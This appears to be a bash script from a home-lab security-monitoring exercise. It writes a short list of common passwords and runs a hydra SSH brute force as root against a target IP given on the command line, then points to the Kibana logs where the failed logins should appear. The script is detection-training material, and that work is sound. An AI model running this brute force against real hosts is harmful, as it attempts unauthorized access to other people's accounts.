#!/bin/bash
# Mini SOC — Red team attack #2: Hydra SSH brute force.
#
# Tries a tiny wordlist against SSH on the target. Expected to light up:
#   • /var/log/auth.log on the target: many "Failed password" lines
#   • Filebeat system module ships them → Logstash tags soc.auth.failed
#   • Packetbeat captures the TCP flows to port 22
#   • auditd logs the auth events
#
# Usage:  bash 02-hydra-bruteforce.sh <target-ip>
#
# The wordlist is tiny on purpose — we want a quick, visible burst of failures,
# not an actual break-in. Username is 'root' (disabled by default on Ubuntu),
# so all attempts will fail cleanly.

set -euo pipefail

TARGET="${1:-}"
WORDLIST="/tmp/mini-soc-wordlist.txt"
USER="root"

if [[ -z "${TARGET}" ]]; then
  cat <<EOF >&2
Usage: $0 <target-ip>
Example: $0 10.10.10.20

Runs:  hydra -l ${USER} -P ${WORDLIST} ssh://<target> -t 4 -V
EOF
  exit 1
fi

if ! command -v hydra >/dev/null 2>&1; then
  echo "❌ hydra not installed. On Kali: already present. Elsewhere: sudo apt install hydra" >&2
  exit 1
fi

# Inline wordlist — top ~20 worst passwords of all time, plus a few SSH classics.
cat > "${WORDLIST}" <<'EOF'
admin
password
123456
12345678
qwerty
letmein
welcome
root
toor
changeme
passw0rd
P@ssw0rd
administrator
iloveyou
monkey
dragon
sunshine
princess
abc123
1q2w3e4r
EOF

cat <<BANNER

╔══════════════════════════════════════════════════════════════════╗
║  ATTACK 2 — Hydra SSH brute force                                ║
║  Target   : ${TARGET}                                            ║
║  User     : ${USER}                                              ║
║  Passwords: $(wc -l < "${WORDLIST}") candidates                   ║
╚══════════════════════════════════════════════════════════════════╝

What to look for in Kibana:
  Index : soc-system-*
  Tag   : soc.auth.failed
  Field : source.ip = <attacker>, user.name = ${USER}
  Expect: ~$(wc -l < "${WORDLIST}") "Failed password for root" entries within ~10 seconds.

Also: soc-packetbeat-* will show TCP flows to destination.port = 22.

Starting attack now...
BANNER

hydra -l "${USER}" -P "${WORDLIST}" "ssh://${TARGET}" -t 4 -V || true

echo
echo "✓ Attack complete. In Kibana, create a table of:"
echo "    source.ip  user.name  count"
echo "  filtered by tags: soc.auth.failed — your attacker IP should dominate."
